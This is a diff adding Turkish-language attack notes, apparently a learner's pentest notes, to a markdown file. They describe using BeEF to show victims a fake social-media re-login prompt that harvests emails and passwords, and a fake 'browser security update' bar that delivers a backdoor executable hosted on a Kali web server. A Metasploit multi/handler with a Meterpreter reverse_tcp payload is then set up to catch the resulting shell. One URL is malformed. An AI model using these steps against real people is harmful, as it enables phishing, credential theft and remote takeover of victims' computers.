@@ -79,3 +79,26 @@ res.Body = body.replace(
   Backing: Grey , Logo : Logo girilir inandırıcılık için
 
 - Kurbanın tarayıcısında küçük aarayüz açılır. Facebook,instagram tekrar giriş yapın tarzı. Kurban bilgilerini girerse şifre eposta alıınır
+
+**_ Backdoor İletme Yöntemi _**
+
+- Beef ile Tarayıcıdan backdoor göndererek kurabının bilgisayarı ele geçirilir
+
+- Backdoor oluşturulur
+- Kali Web haline getirilir. Kali web klasörüne backdoor yerleştirilir. Backdoor bir web servisten indirilecektir.
+
+> service apache2 start
+
+- Beef'ten "Fake Notification Bar (crome)" açılır. Url: kısmına kali web .exe urlsi girilir. Url: "http:/10.2.0/backdoor/plugin.exe" , Notification Text:"Tarayıcı güvenlik güncellemesi yapınız."
+
+> msfconsole //açılır
+> use exploit/multi/handler
+> msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp //oluşturulan backdoor bilgileri
+> msf6 exploit(multi/handler) > show options
+> msf6 exploit(multi/handler) > set LHOST 192.168.64.2
+> msf6 exploit(multi/handler) > set LPORT 8080
+> msf6 exploit(multi/handler) > exploit -j -z
+> msf6 exploit(multi/handler) > session -l
+> msf6 exploit(multi/handler) > session -1
+
+**_ Backdoor İletme Yöntemi _**
